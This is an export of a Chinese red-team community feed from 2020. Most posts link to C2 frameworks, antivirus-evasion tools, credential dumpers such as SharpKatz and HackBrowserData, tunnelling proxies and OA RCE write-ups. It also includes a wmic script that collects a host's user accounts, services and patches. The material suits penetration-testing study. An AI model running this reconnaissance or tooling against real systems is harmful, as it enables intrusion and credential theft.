基于白名单zipfildr.dll执行payload第十八季<br>11.19 基于白名单msiexec执行payload第十九季<br>11.20基于白名单ftp.exe执行payload第二十季<br>11.21 网络安全学习方法论之体系的重要性<br>第二十章  工具优化以及分享<br>12.1 解决 msfvenom命令自动补全<br>12.2 工具介绍-the-backdoor-factory <br>12.3 工具介绍veil-EVASION<br>12.4 离线cyberchef使用指南<br>第十三章 案例分享<br>13.1 某次项目技术点实录-regsvr32 ole 对象<br>13.2 阿里云access token问题-项目收获记录<br>13.3 从打点到域控的练习<br>13.4 安防软件bypass<br>13.5 docker常用命令与dokcer逃逸漏洞复现<br>13.6  渗透沉思录<br>13.7 项目回忆：体系的本质是知识点串联<br>13.8  frida在app远程加解密的应用<br>13.9 漏洞修复系列之oracle远程数据投毒修复(非RAC环境）<br>13.10  记一次ueditor老版本的非常规getshell<br>13.11 云安全公测大赛初赛game app题目解析<br>13.12  三层靶机搭建以及内网渗透（附靶场环境）<br>13.13 记一次简单的漏洞利用与横向<br>13.14 翻译文章<br>13.14.1 CVE-2019-12757:symantec endpoint protection 中的本地权限提升<br>13.14.2 攻击SQL SERVER CLR程序集<br>13.14.3  AMTHoneypot蜜罐指南<br>13.14.4 cobaltstike 使用混淆绕过windows defeder<br>13.14.5 渗透实战-从打点到域控的全过程<br>13.14.16  dokcer极速入门<br>13.14.17 记一次应急响应样本分析<br>第十四章  运营<br>14.1.如何将金字塔原理在运营中应用<br>14.2. 活动心得-如何举办一场沙龙活动<br>14.3.从用户中来，到用户中去<br>14.4 文章与活动之间的关联

```
Wing: backlion 整理。
lengyi: 这是，某恒的目录？
Wing: 对啊
lengyi: 完全可以 [强][强][强]
```
# RedTeaming - 2020-08-05
`#Burp插件#`  <br>shiro反序列化Burp完美回显插件（非宽字节安全存在bug的插件），可配合wing师傅之前发的被动扫描shiro的Burp插件使用，大大提高渗透效率。<br>[GitHub+-+0x141/ShiroRce-Burp](https://github.com/0x141/ShiroRce-Burp)


# RedTeaming - 2020-08-05
谷歌出品的关于绕过内存查杀的文章<br><br><br>[http://feedproxy.google.com/~r/SecurityBloggersNet...](http://feedproxy.google.com/~r/SecurityBloggersNetwork/~3/3937O87cO10/)

```
Wing: 想办法实践
```
# RedTeaming - 2020-08-05
使用 wmic 进行信息收集 <br><br><br>for /f "delims=" %% A in ('dir /s/b % WINDIR%\system32\*htable.xsl') do set "var=%% A"<br><br>wmic process get CSName,Description,ExecutablePath,ProcessId /format:"% var%" >> out.html<br>wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:"% var%" >> out.html<br>wmic USERACCOUNT list full /format:"% var%" >> out.html<br>wmic group list full /format:"% var%" >> out.html<br>wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:"% var%" >> out.html<br>wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:"% var%" >> out.html<br>wmic netuse list full /format:"% var%" >> out.html<br>wmic qfe get Caption,Description,HotFixID,InstalledOn /format:"% var%" >> out.html<br>wmic startup get Caption,Command,Location,User /format:"% var%" >> out.html<br>wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:"% var%" >> out.html<br>wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:"% var%" >> out.html<br>wmic Timezone get DaylightName,Description,StandardName /format:"% var%" >> out.html


# RedTeaming - 2020-08-05
`#MacTips#` <br>让Iterm2在任意应用中处于最上层，随时显示或消失。<br>[如何让iterm2+在任何界面呼入呼出？+-+知乎](https://www.zhihu.com/question/51622732)


# RedTeaming - 2020-08-05
`#C2#`  <br>[GitHub+-+sysdream/chashell:+Chashell+is+a+Go+rever...](https://github.com/sysdream/chashell)<br>利用DNS进行通信，HW期间可以拿来Phishing。


# RedTeaming - 2020-08-05
`#C2#` <br>SharpC2<br>下一步有时间就学这个，作者还在开发中，现在能跑起来了。但是我本地客户端连接teamserver的时候就发生异常。有兴趣的师傅可以本地跑下看看，讨论一下。<br><br>[GitHub+-+SharpC2/SharpC2:+.NET+C2+Framework+Proof+...](https://github.com/SharpC2/SharpC2)


# RedTeaming - 2020-08-05
`#内网渗透#`  <br>这篇blog讲了域内token的利用方式，工具我就只清楚runas和incognito。其他的还得清大家补充下。这玩意特别重要！！实践证明一切。tson直接过去。<br>[https://blog.cobaltstrike.com/2015/12/16/windows-a...](https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/)

```
z3r0yu: 这么 diao 吗，学一下学一下
```
# RedTeaming - 2020-08-05
`#内网渗透#`   `#百宝箱#` <br>Bypass师傅整理的笔记👍👍👍<br>[GitHub+-+Bypass007/Learn-security-from-0:+从0开始学安全，...](https://github.com/Bypass007/Learn-security-from-0)
![](https://images.zsxq.com/Flnv6PJOx8Kx7jXQb5VWgWEH5ik0?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:IO5iJsibjXMXi-7CCN9342-3KBU=)

# RedTeaming - 2020-08-06
很久之前国外的一个安全团队曾经更新过一些关于对抗的技术，如今安全研究员将其整合成了一个数据库，内容我看了下还是很不错的，作为字典或者tips还是很好的<br><br>[Unprotect+Project](https://search.unprotect.it/map)<br><br>看图，前端我很喜欢。
![](https://images.zsxq.com/FoVsnpCWmHIIBIl3Kex_IjndQfN3?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-8-SPXna3SN7Z8y53wR-QVWXlIs=)
![](https://images.zsxq.com/FkT5WAKswF0zY88G_ZkomIlfdvXR?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:5DesgdFWr8LhCmP0ZkFJ0K-HVyA=)
```
Wing: Nice
```
# RedTeaming - 2020-08-06
`#redteam#` <br>Checkpoint发布的反调试框架<br>[Anti-Debug+Tricks](https://anti-debug.checkpoint.com/)<br>以及反调试实例工具ShowStopper<br>[GitHub+-+CheckPointSW/showstopper:+ShowStopper+is+...](https://github.com/CheckPointSW/showstopper)


# RedTeaming - 2020-08-07
`#Burp插件#`  <br>ShiroScan<br>最近怎么这么多插件尼<br>[https://github.com/Daybr4ak/ShiroScan/releases/dow...](https://github.com/Daybr4ak/ShiroScan/releases/download/0.4/ShiroScan.jar)


# RedTeaming - 2020-08-07
`#内网渗透#`  <br>代理搭建的重要性。<br>Termite是我之前最喜欢用的以及ew，但是没有源码，免杀就比较困难。<br>[GitHub+-+ph4ntonn/Stowaway:+👻Stowaway+--+Multi-hop...](https://github.com/ph4ntonn/Stowaway) <br><br>这个工具的优点：<br>- 普通的端口复用<br>- 节点树形式，多层代理的情况下，快速切换代理<br>- AES加密通信<br>- socks代理，端口转发，文件上传下载等功能<br>缺点：<br>给白嫖就不错了，还挑刺。狗头
![](https://images.zsxq.com/FsxVDiwDibCTV0JOtT9ZHHso0Ceh?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:rQUTwZXol4sno3cfOhuan9diGeM=)
```
z3r0yu: 这个稳定性咋样？
Wing: go 写的基本没啥事。我前几次用 ew 容易断。看大家的使用情况怎么样。
z3r0yu: 近期用 venom 就容易崩溃掉线，这个还没尝试
```
# RedTeaming - 2020-08-07
`#内网渗透#`  <br>代理搭建的重要性。<br>Termite是我之前最喜欢用的以及ew，但是没有源码，免杀就比较困难。<br>[GitHub+-+ph4ntonn/Stowaway:+👻Stowaway+--+Multi-hop...](https://github.com/ph4ntonn/Stowaway) <br><br>这个工具的优点：<br>- 普通的端口复用<br>- 节点树形式，多层代理的情况下，快速切换代理<br>- AES加密通信<br>- socks代理，端口转发，文件上传下载等功能<br>缺点：<br>给白嫖就不错了，还挑刺。狗头
![](https://images.zsxq.com/FsxVDiwDibCTV0JOtT9ZHHso0Ceh?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:rQUTwZXol4sno3cfOhuan9diGeM=)
```
z3r0yu: 这个稳定性咋样？
Wing: go 写的基本没啥事。我前几次用 ew 容易断。看大家的使用情况怎么样。
z3r0yu: 近期用 venom 就容易崩溃掉线，这个还没尝试
```
# RedTeaming - 2020-08-07
[GitHub+-+rapid7/metasploit-framework:+Metasploit+F...](https://github.com/rapid7/metasploit-framework)<br><br>Msf6


# RedTeaming - 2020-08-08
`#红队武器化研发#`  <br>Red Team Scripts by d0nkeys (ex SnadoTeam)<br>[GitHub+-+d0nkeys/redteam:+Red+Team+Scripts+by+d0nk...](https://github.com/d0nkeys/redteam)


# RedTeaming - 2020-08-09
`#渗透工具#` <br>Mac中安装JDK1.8和JDK11双版本并任意切换，从而可以使用BurpSuite MacOSX最新版，官方的是使用install4j打包的，好处就是可以全屏。全屏很方便使用。<br><br>export JAVA_8_HOME="$(/usr/libexec/java_home -v 1.8)"<br>export JAVA_11_HOME="$(/usr/libexec/java_home -v 11)"<br>alias jdk8='export JAVA_HOME=$JAVA_8_HOME'<br>alias jdk11='export JAVA_HOME=$JAVA_11_HOME'<br>export JAVA_HOME=$JAVA_8_HOME<br><br>下载地址：[法海之路+-+佛悟心中寒](https://www.fahai.org/)<br>[Mac中安装JDK1.8和JDK11双版本并任意切换+-+Pykk2019+-+博客园](https://www.cnblogs.com/PyKK2019/p/10587897.html)
![](https://images.zsxq.com/FqNFKZncPEsFUrUZZMa2bQHn9WfO?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:2LbtMmB7H6T2uHYHmJTCFjwp9VM=)
```
z3r0yu: 我一直用的 jenv 切换多版本 Java
```
# RedTeaming - 2020-08-09
`#渗透技巧#` <br><br>[渗透测试中获取+fastjson+精确版本号的方法](https://mp.weixin.qq.com/s/o_YjL7il3xlRJIWm0ptGXg)


# RedTeaming - 2020-08-10
`#CSTips#`  <br>更改4.0特征<br>[cs_custom_404/4.0+at+master+·+Ridter/cs_custom_404...](https://github.com/Ridter/cs_custom_404/tree/master/4.0)


# RedTeaming - 2020-08-11
Wing 基佬要的 [坏笑][坏笑]<br><br> 转自推
![](https://images.zsxq.com/FphxPNh_8FWD-NBwNAjJf-azUrlI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:RUvH0inyJb1jSkizEyQEHwiAfuQ=)
```
裤衩哥: 可能是我身体不好，眼睛都花了 [奸笑]
L: 肾透支了，快去买个肾宝。喝一口醒神提脑
裤衩哥: 两口长生不老
```
# RedTeaming - 2020-08-11
`#cs插件#` <br>[GitHub+-+pandasec888/taowu-cobalt-strike+at+englis...](https://github.com/pandasec888/taowu-cobalt-strike/tree/english)


# RedTeaming - 2020-08-11
`#CTips#` <br>关于pdb文件你要知道的事<br>[Definitive+Dossier+of+Devilish+Debug+Details+–+Par...](https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html)<br><br>- 关闭Debug


# RedTeaming - 2020-08-12
`#Tool#`  <br>BloodHound详细教程<br>[安全技术|BloodHound+使用指南](https://mp.weixin.qq.com/s/dBWq1rCZYVS9oDgIGwcCdA)


# RedTeaming - 2020-08-12
`#书籍#`  <br>传说中的百科全书<br><br>链接：[https://pan.baidu.com/s/1k8XO7lGzYL-uRnrLBIVefQ](https://pan.baidu.com/s/1k8XO7lGzYL-uRnrLBIVefQ) 提取码：g3Zf

```
Wing: 内容不做评论，但是可以照着这个结构去学习，结构化整理。
裤衩哥: 我的话好吧 [Emm]
```
# RedTeaming - 2020-08-12
 `#免杀#`  <br>PEzor这个工具，免杀效果挺好的，除了卡巴其他的都不会识别。报的是donut shellcode。编译过程会遇到一些坑，如果遇到的可以再问。建议在Kali下编译，keystone的安装要去看官方文档才行。

```
迪迦奥特曼: mac 下很好装了， 就是 donut 在 mac 下运行不了 。。。
Wing: 对啊。[奸笑][奸笑][奸笑]
迪迦奥特曼: 这个能直接处理 cs 生成的 beacon.exe 吗，来个教程吧 [可怜]
```
# RedTeaming - 2020-08-15
`#RedTeam#`  <br>一个自己记录的CobaltStrike相关资源汇总，包含了BOF资源<br>1. 一部分是近期做RedTeam项目的时候看到的一些关于CobaltStrike不错的文章<br>2. 目前网上的Aggressor Script种类繁多，大多数资源的聚合都是只给出对应的链接，而不说明是干什么的，以至于在查看时不知道如何选择，要一个一个打开看<br>3. 关于新特性BOF资源的整合<br>4. 解决要用的时候找不到合适aggressor script或者BOF的问题<br>5. 如果有本repo没有涉及的优质内容，欢迎大家提交pr<br>6. 欢迎大家来star<br>链接：[GitHub+-+zer0yu/Awesome-CobaltStrike:+cobaltstrike...](https://github.com/zer0yu/Awesome-CobaltStrike)


# RedTeaming - 2020-08-16
是什么让这里静悄悄的呢？是爱吗？不是，是 H-/:.’W


# RedTeaming - 2020-08-16
BlackHat的C2 隐藏议题<br><br>[GitHub+-+SixGenInc/Noctilucent:+Using+TLS+1.3+to+e...](https://github.com/SixGenInc/Noctilucent)

```
Wing: 测过吗……
lengyi: 没时间测啊﹉
Wing: 我晚上整下。
Wing: 跑起来了，没成功，暂时先用着 cs 的了。
```
# RedTeaming - 2020-08-16
`#Poc-Exp#` <br><br>[HW前的礼盒:通达OA+0day请查收](https://mp.weixin.qq.com/s/9w3-xJPaUFFPkJSQrtOTnw)

```
-: 求一份求一份
Wing: [HW前的礼盒:通达OA+0day请查收_黑客技术](http://www.hackdig.com/08/hack-111538.htm)
```
# RedTeaming - 2020-08-17
欢迎复现，rust我实在是不会，环境太难弄了，有能力的师傅重写吧，或者过几天我重写。。。<br><br>[https://zerosum0x0.blogspot.com/2020/08/sassykitdi...](https://zerosum0x0.blogspot.com/2020/08/sassykitdi-kernel-mode-tcp-sockets.html?m=1)


# RedTeaming - 2020-08-17
`#CTips#`  <br>脱VMP?<br>[GitHub+-+can1357/NoVmp:+A+static+devirtualizer+for...](https://github.com/can1357/NoVmp)


# RedTeaming - 2020-08-17
很尴尬<br><br>[WebSphere+远程代码执行漏洞CVE-2020-4450](https://mp.weixin.qq.com/s/cG8onNoNsYWGZNQdp1XI3Q)
![](https://images.zsxq.com/Fl3SGwS7hVdeEItQl_IIpBgQjF62?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lL1IKgSLGp94vj45YjckH9URbXE=)

# RedTeaming - 2020-08-18
 `#Poc-Exp#`  <br>备份留存一下<br>深信服EDR RCE AND 通达OA 历史漏洞


# RedTeaming - 2020-08-18
 `#Poc-Exp#`  <br>备份留存一下<br>深信服EDR RCE AND 通达OA 历史漏洞


# RedTeaming - 2020-08-18
`#Poc-Exp#`  <br>Ant Design暗黑模式,Start Coding.<br><br>[https://preview.pro.ant.design/dashboard/monitor](https://preview.pro.ant.design/dashboard/monitor)<br><br>Vue版和React版


# RedTeaming - 2020-08-18
`#碎碎念#`  <br>[微笑][微笑][微笑]以后每一次实战中的反弹shell一定要加密[微笑][微笑][微笑]<br><br>[Linux下的权限维持+|+Wing+|+RedTeamer](https://evilwing.me/2020/03/04/linux-xia-de-quan-xian-wei-chi/#toc-heading-14)
![](https://images.zsxq.com/Fm2hnhBfcJVOvO7taslgZZm_Xntd?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:JoQqw5Pv4aRey0jI3DV0bjrT91c=)
```
Wing: 已去世
裤衩哥: 肯定啊，就是有些环境中没有 openssl
裤衩哥: 有些事，一旦发现就不再 [奸笑]
z3r0yu: 被别人接走啦？😂话说这样子弹不好管理吧？如果我弹好多台的话
```
# RedTeaming - 2020-08-19
`#没什么用的花里胡哨的技巧#` <br>CSDN格式化打印<br>(function(){<br>$("#side").remove();<br>$(" `#comment_title, #` comment_list,  `#comment_bar, #` comment_form, .announce,  `#ad_cen, #` ad_bot").remove();<br>$(".nav_top_2011,  `#header, #` navigator").remove();<br>$(".p4course_target, .comment-box, .recommend-box,  `#csdn-toolbar, #` tool-box").remove();<br>$("aside").remove();<br>$(".tool-box").remove();<br>$("main").css('display','content'); <br>$("main").css('float','left'); <br>window.print();<br><br>$("tool-box").remove();<br>})();


# RedTeaming - 2020-08-19
 `#Nday#` <br>通达OA RCE【OA V11.6】


# RedTeaming - 2020-08-19
#渗透技巧<br>一条命令push burp证书到模拟器,变成系统根证书.<br><br># [Security+Chops+|+/dev/random+-+One+Liner+For+Insta...](https://securitychops.com/2019/08/31/dev/random/one-liner-to-install-burp-cacert-into-android.html)<br>#<br>curl --proxy [http://127.0.0.1:8080](http://127.0.0.1:8080) -o cacert.der http://burp/cert  \<br>&& openssl x509 -inform DER -in cacert.der -out cacert.pem \<br>&& cp cacert.der $(openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1).0 \<br>&& adb root \<br>&& adb remount \<br>&& adb push $(openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1).0 /sdcard/ \<br>&& echo -n "mv /sdcard/$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1).0 /system/etc/security/cacerts/" | adb shell \<br>&& echo -n "chmod 644 /system/etc/security/cacerts/$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1).0" | adb shell \<br>&& echo -n "reboot" | adb shell \<br>&& rm $(openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1).0 \<br>&& rm cacert.pem \<br>&& rm cacert.der<br><br>[https://gist.github.com/vavkamil/ad5ddbeec4685c6bc...](https://gist.github.com/vavkamil/ad5ddbeec4685c6bca271063d0c95054)


# RedTeaming - 2020-08-20
`#安全基础#`  <br><br><br><br>[IDA使用简易教程_学逆向论坛|免费的CTF在线练习平台|ctf攻防训练靶场|网安夺旗竞赛系统|软件...](https://www.xuenixiang.com/thread-99-1-1.html)<br><br>[[IDA教程]01-从零开始用IDA做逆向-判断PE文件是32位还是64位、选项卡介绍+-+17bd...](https://www.cnblogs.com/17bdw/p/12239505.html)


# RedTeaming - 2020-08-20
`#渗透技巧#` <br><br>[通过命令下载执行恶意代码的几种姿势](https://mp.weixin.qq.com/s/pz6y8299gMUOgtZjZv5puw)


# RedTeaming - 2020-08-21
`#红队技巧#`  <br>通过Win32Api创建用户Demo<br><br>[Backdoorplz/AddUser.cpp+at+master+·+jfmaes/Backdoo...](https://github.com/jfmaes/Backdoorplz/blob/master/EXE/AddUser.cpp)


# RedTeaming - 2020-08-21
`#内网渗透#`  <br>渗透基础——域用户的密码永不过期属性<br><br>[渗透基础——域用户的密码永不过期属性](https://mp.weixin.qq.com/s/e-oJZAPBswObNDvGctAHwg)


# RedTeaming - 2020-08-21
`#msf6更新的功能#` <br>* 初始功能包括Meterpreter通信的端到端加密<br>* SMBv3客户端支持<br>* Windows Shellcode的新的多态有效载荷生成<br><br> `#msf6新的exp#` <br>* Documalis JPEG缓冲区溢出<br>* Docker特权逃逸<br>* Nimsoft 7.80 -wetw0rk的远程缓冲区溢出 - CVE-2020-8012<br><br> `#增强功能#` <br>* 允许导入OpenVAS扫描中报告的，未分配CVE或BID的漏洞<br>* 添加了必要的基础结构，以从外部数据文件加载和处理多态程序集存根，并使用它来动态地重新排序Block API存根的指令，该指令为所有x86和x64本机Windows有效负载提供动力。<br>* Metasploit对Rails的依赖性从4.2.6更新到了5.2<br>* 进一步相结合PSEXEC支持通过添加ARCH_CMD目标到exploit/windows/smb/psexec模块和弃用auxiliary/admin/smb/psexec_command<br>* 更新了SMB版本扫描模块，除了主机操作系统信息外，该模块现在还报告诸如支持的SMB版本，SMB的首选方言，SMB 3.1.1加密和压缩功能，服务器的GUID值以及服务器已联机。这也将弃用smb1和smb2模块。<br>* 去除，以支持延伸的Mimikatz Meterpreter就会延长。Mimikatz扩展名当前是Kiwi的别名，它将在一段时间内打印警告消息，以允许用户平稳过渡到新工作流程。该post/windows/gather/credentials/sso模块也进行了更新，以使用Kiwi代替Mimikatz。<br><br>* 改变用于有效载荷使用Metasploit的反射DLL注入能力和由任一序号或名称利用于解析的功能。这使框架可以利用最近的有效负载更新来删除字符串名称，然后按顺序解析必要的值。框架的更改与使用标准ReflectiveLoader名称的Reflective DLL向后兼容。<br><br>* 增加TLV加密支持Python的Meterpreter就会，使其能够安全地与框架进行通信。<br>* 添加了对客户端操作的SMBv3支持。现在，已经使用新SMB客户端的模块将能够连接到具有所有3种SMB v3方言（3.0、3.0.2、3.1.1）的服务器。如果协商了SMB 3.x方言，则默认行为是对与服务器的通信进行加密。用户可以通过将SMB :: AlwaysEncrypt设置为false来禁用此功能。<br>* 更改用来协商TLV加密Meterpreter就会在二进制DER格式而不是基于文本的PEM格式传输的RSA密钥。这使密钥更小，更易于处理，并删除了静态的“ BEGIN PUBLIC KEY”字符串。<br>* Sharphound模块的加入<br>PR ＃13194从h00die提高警犬模块的支持，具体如下：<br><br>对Sharphound v3的更新<br>新增了将exe写入磁盘并运行它的功能，由于权限和策略，它比ps1更受青睐。<br>将选项添加到EncryptZip，默认情况下设置为true。这为文件增加了一些保护，并且输出存储为注释<br>添加NoSaveCache选项以避免将文件写入磁盘并将其保留在磁盘上<br>避免使用参数（如果它们是默认值），这会使要运行的命令（以及在线传递的命令）大大缩短。<br><br><br>* 对tools / dev / check_external_scripts.rb进行了更改，以包含其他与JohnTheRipper和sqlmap相关的文件。这允许tools / dev / check_external_scripts.rb提供所有与JohnTheRipper和sqlmap相关的库和配置文件最新的保证。<br><br><br> `#错误修复#` <br>* 修复了一个极端情况下的错误，该错误可能会但不太可能在套接字读取期间出现竞争情况，并且发送到postgres解析器的数据的值为nil。这将在尝试解析数据之前验证数据是否为零<br>* 正挂载点的finesystem.rb关闭和拆除。以前，我们无法返回该句柄或无法正确关闭安装点。<br>* 修复中随附的更新最近的密码改变的错误; 以前，我们假设所有Java版本都可以支持256位加密，但是某些较旧的环境无法支持该功能。如果远程Java版本无法协商256位，则在此处添加AES-128-CBC作为TLV加密的附加选项作为后备<br><br>来源链接:<br>[Metasploit+Wrap-Up](https://blog.rapid7.com/2020/08/07/metasploit-wrap-up-76/)<br>[Metasploit+6+Now+Under+Active+Development](https://blog.rapid7.com/2020/08/06/metasploit-6-now-under-active-development/)


# RedTeaming - 2020-08-23
`#内网渗透工具集#` <br>[GitHub+-+b4rtik/SharpKatz:+Porting+of+mimikatz+sek...](https://github.com/b4rtik/SharpKatz)<br><br>猕猴桃的轻量版


# RedTeaming - 2020-08-24
#渗透技巧<br>Windows下绕过disable_function<br>[T00LS+|+低调求发展+-+潜心习安全](https://www.t00ls.net/thread-57591-1-1.html)


# RedTeaming - 2020-08-24
`#安全基础#`  <br>推荐一波React的教程,我觉得讲的很简单.<br>[https://www.bilibili.com/video/av413129060?p=4](https://www.bilibili.com/video/av413129060?p=4)<br><br>一开始我是用Vue,写的系统也是阿里的Ant框架,非常成熟了,Vue版本也很好用,官方的是React,顺手学一波.


# RedTeaming - 2020-08-25
`#内网渗透工具集#`  <br>patch termsrv.dll<br>作用:允许多个会话<br>缺点:只能Win10<br>[GitHub+-+infosecn1nja/SharpDoor:+SharpDoor+is+alte...](https://github.com/infosecn1nja/SharpDoor)


# RedTeaming - 2020-08-26
`#蓝队矩阵#` <br>[Active+Defense+Matrix](https://shield.mitre.org/matrix/)


# RedTeaming - 2020-08-26
`#Android#` <br>[Usage+CN+·+refate/frider+Wiki+·+GitHub](https://github.com/refate/frider/wiki/Usage-CN)<br><br>现在自动化越来越猛
![](https://images.zsxq.com/Fu1Cdz9Sh-hm_eLaJXgcSGYsyfUL?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:CS6AxmaTW2SwWSTgfVfhCLhWnUw=)

# RedTeaming - 2020-08-26
`#红队技巧#` <br><br>[MySQL蜜罐获取攻击者微信ID](https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg)


# RedTeaming - 2020-08-26
`#渗透工具#`  <br>老版本的mysql任意文件读取服务端伪造工具不太好用，360的那个也好用，这个刚看到。<br><br>[GitHub+-+ev0A/Mysqlist:+Mysql+Server端伪造-任意文件读取-CTF...](https://github.com/ev0A/Mysqlist)

```
z3r0yu: 360 那个是哪个？
```
# RedTeaming - 2020-08-27
 `#碎碎念#` <br>go get github.com/mitchellh/gox<br><br>一键编译成各个平台的版本 <br>gox -h
![](https://images.zsxq.com/FgDEv7ZYHdzMywxH96sGYlpcEf_X?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:wvaeo8_HPaLEPp-4hmDMj3Pk630=)
```
CoolCat: go mod 也能一键解忧愁
L: 说个丢人的事情，go 安个第三方包。搞了两个多小时 goland 死活加载不到 [捂脸]
Wing: go 版本升级到 14 以上，然后用 go mod 管理。不然一般项目都得放到 src 那个目录里面。
L: 我待会试试👌
```
# RedTeaming - 2020-08-27
 `#碎碎念#` <br>go get github.com/mitchellh/gox<br><br>一键编译成各个平台的版本 <br>gox -h
![](https://images.zsxq.com/FgDEv7ZYHdzMywxH96sGYlpcEf_X?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:wvaeo8_HPaLEPp-4hmDMj3Pk630=)
```
CoolCat: go mod 也能一键解忧愁
L: 说个丢人的事情，go 安个第三方包。搞了两个多小时 goland 死活加载不到 [捂脸]
Wing: go 版本升级到 14 以上，然后用 go mod 管理。不然一般项目都得放到 src 那个目录里面。
L: 我待会试试👌
```
# RedTeaming - 2020-08-28
`#外网渗透技巧#` <br><br>Docker漏洞的总结,来源:Bypass<br>[GitHub+-+Bypass007/Learn-security-from-0:+从0开始学安全，...](https://github.com/Bypass007/Learn-security-from-0)


# RedTeaming - 2020-08-28
 `#外网渗透技巧#`  <br>我上次的BurpSuite2020.8的Mac版本


# RedTeaming - 2020-08-28
`#内网渗透技巧#` <br>SCshell 技术细节<br><br>[【渗透技巧】SCshell+技术细节+|+RcoIl的窝](https://rcoil.me/2019/12/%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91SCshell%20%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82/)


# RedTeaming - 2020-08-28
`#碎碎念#` <br>.NET5知多少?<br>[.NET+5+Preview+1的深度解读和跟进+-+Eric+zhou+-+博客园](https://www.cnblogs.com/tianqing/p/12555235.html)


# RedTeaming - 2020-08-28
 `#碎碎念#`  <br>来安利一些Go写的扫描平台？

```
裤衩哥: 我选择手动 [撇嘴]
z3r0yu: kunpeng？
Wing: 这个是框架，我想找分布式的。
```
# RedTeaming - 2020-08-30
 `#内网渗透技巧#` <br>httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne

```
z3r0yu: httpx 我在用的时候代理进内网没反应，当时没具体看什么原因，最后还是用自己撸的脚本搞定了
```
# RedTeaming - 2020-08-31
`#外网渗透技巧#` <br><br>[【技术精选】fastjson反序列化漏洞整理](https://mp.weixin.qq.com/s/eWPk6EW0vhx6LDdKeCqYeQ)


# RedTeaming - 2020-08-31
`#内网渗透技巧#`  <br>起代理的时候建议习惯性的加个密码<br><br>[最好用的内网穿透工具合集](https://mp.weixin.qq.com/s/1B1_eYakY9unA65tHKRz9Q)

```
yuhao: Neo-reGeorg 自带 key 还可以
```
# RedTeaming - 2020-08-31
`#内网渗透工具#` <br>[GitHub+-+lz520520/railgun](https://github.com/lz520520/railgun)<br><br>扫内网指纹不错


# RedTeaming - 2020-08-31
`#浏览器密码抓取#` <br>代替lazagne的工具<br>[GitHub+-+moonD4rk/HackBrowserData:+Decrypt+passwor...](https://github.com/moonD4rk/HackBrowserData)


# RedTeaming - 2020-08-31
`#外网渗透技巧#`  <br>渗透辅助工具插件.就是把常用的命令集成到浏览器插件里面.这个可以.看我明天怎么魔改他.<br>[https://github.com/LasCC/Hack-Tools/releases](https://github.com/LasCC/Hack-Tools/releases)<br><br>老懒人了
![](https://images.zsxq.com/FhouWTwD3VQuEMHX2XobzhhKPSLm?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:19fXVB1NPY1DWSpe_OS_dhgbB7Q=)
```
裤衩哥: 收藏了
Patrilic: 摸鱼计划
Black cher*: 叼
```
# RedTeaming - 2020-09-01
`#免杀#`   `#红队技巧#`  <br><br>Msf绕过杀软<br><br>[https://medium.com/securebit/bypassing-av-through-...](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)

```
裤衩哥: 直接编译 loader
lengyi: 过几天估计就 GG 了，毕竟上了 VT
```
# RedTeaming - 2020-09-01
